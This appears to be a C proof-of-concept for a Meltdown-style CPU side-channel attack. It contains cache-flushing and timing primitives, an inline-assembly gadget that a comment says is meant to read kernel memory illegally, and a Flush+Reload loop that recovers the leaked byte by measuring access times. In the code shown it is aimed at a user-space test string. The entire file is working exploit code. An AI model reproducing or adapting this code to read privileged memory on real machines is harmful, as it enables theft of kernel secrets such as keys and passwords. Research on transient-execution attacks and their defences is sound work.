#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <sched.h>


//Array os size 256 pages. (Each page is associated to an ASCII char)
char array[256*4096];

//The offset in the page to access a byte
#define DELTA 1024


//This is used to touch the address p
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

//Flushing the address p from the caches 
static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

//Flushing the array for all the corresponding ASCII chars 
static inline
void flush_array()
{	
	for (int i = 0; i < 256; i++) {
		array[i*4096 + DELTA] = 1;
	}
	for (int i=0; i<256*4096; i++) {
		flush((void*) array + i);
	}
}

//Assembly code to access the kernel virtual space illegally
static inline
void myaccess(void* addr){
	asm volatile(
		"1:\n\t"

		".rept 400;"                
		"add $0x141, %%rax;"
		".endr;"

		"movzx (%[address]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"add $1024, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"
		:
		: [target] "r" (array), [address] "r" (addr)
		: "rax", "rbx"
	);
}



int main(int argc, char const *argv[]){
	char * test = "abcdefghijklmnopqrstuvwxyz";

	flush_array();

	myaccess((void*) test);

	int value = 0;
	int junk = 0;
	uint64_t min_time;
	uint64_t time;
	for(int j=0;j<1000;j++){
		min_time = 1000000;
		time = 0;
		for(int i=0;i<256;i++){
			register uint64_t time1,time2;
			time1 = __rdtscp(&junk);
			junk = array[i*4096+DELTA];
			time2 = __rdtscp(&junk)-time1;
			flush((void*) array+i*4096+DELTA);

			//printf("%d: %zu\n",i,time2);
			if(time2 < min_time) {
				min_time = time2;
				value = i;
			}
			time += time2;
		}
		if(value == 97) break;
	}
	printf("Avg Access time : %zu\n",time/255);
	printf("Min access time : %zu at %d \n",min_time,value);
}